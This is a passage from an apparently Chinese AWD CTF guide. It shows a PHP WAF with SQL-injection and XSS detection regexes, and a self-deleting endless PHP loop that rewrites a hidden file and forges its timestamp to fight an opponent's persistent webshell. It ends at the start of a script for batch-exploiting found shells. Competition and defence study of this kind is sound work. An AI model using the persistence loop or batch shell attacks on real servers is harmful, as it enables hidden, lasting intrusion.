&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$LOG_FILENAME&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n***************************************************************&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写入日志文件&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果可以我们还可以上通防（一般都是不行）&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 
require_once(&#39;waf.php&#39;)

PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
--&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;customError&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errstr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$errline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;b&gt;Error number:&amp;lt;/b&gt; [&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errno&lt;/span&gt;&lt;/span&gt;],error on line &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errline&lt;/span&gt;&lt;/span&gt; in &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$errfile&lt;/span&gt;&lt;/span&gt;&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;set_error_handler&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;customError&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;E_ERROR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$getfilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#39;|(and|or)\\b.+?(&gt;|&amp;lt;|=|in|like)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$postfilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\\b(and|or)\\b.&amp;#123;1,6&amp;#125;?(=|&gt;|&amp;lt;|\\bin\b|\\blike\\b)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cookiefilter&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\\b(and|or)\\b.&amp;#123;1.6&amp;#125;?(=|&gt;|&amp;lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltKey&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$ArrFiltReq&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
		&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;implode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ArrFiltReq&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/is&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$StrFiltValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
		&lt;span class=&#34;token comment&#34;&gt;//slog (&#34;&amp;lt;br&gt;&amp;lt;br &gt; 操作 IP:&#34;.$_SERVER [&#34;REMOTE_ADDR&#34;].&#34;&amp;lt;br &gt; 操作时间:&#34;.strftime (&#34;% Y-% m-% d % H:% M:% S&#34;).&#34;&amp;lt;br &gt; 操作页面:&#34;.$_SERVER [&#34;PHP_SELF&#34;].&#34;&amp;lt;br &gt; 提交方式:&#34;.$_SERVER [&#34;REQUEST_METHOD&#34;].&#34;&amp;lt;br &gt; 提交参数:&#34;.$StrFiltKey.&#34;&amp;lt;br &gt; 提交参数:&#34;.$StrFiltValue);&lt;/span&gt;
		&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;360WebSec notice: Illegal operation!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$getfilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$postfilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;DefendAttack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cookiefilter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token comment&#34;&gt;# code...&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;slog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$logs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
	&lt;span class=&#34;token variable&#34;&gt;$toppath&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;DOCUMENT_ROOT&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/log.htm&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$toppath&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;a+&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$logs&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\r\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Ts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;对于别人上传过来的不死马进行处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了&lt;/li&gt;
&lt;li&gt;通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config 是木马名）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;set_time_limit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;???&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;//pass=pass&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;touch -m -d &#34;2018-12-01 09:10:12&#34; .config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;usleep&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;当然最好的防御还是攻击&lt;/p&gt;
&lt;h2 id=&#34;利用漏洞攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用漏洞攻击&#34;&gt;#&lt;/a&gt; 利用漏洞攻击&lt;/h2&gt;
&lt;p&gt;d 盾扫出来的 shell 只要手快还是可以先打一波的，可以在赛前提前写好简单的 shell 利用批量化脚本&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; fontTools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;afmLib
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; json
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; re

&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;url.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; url1&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
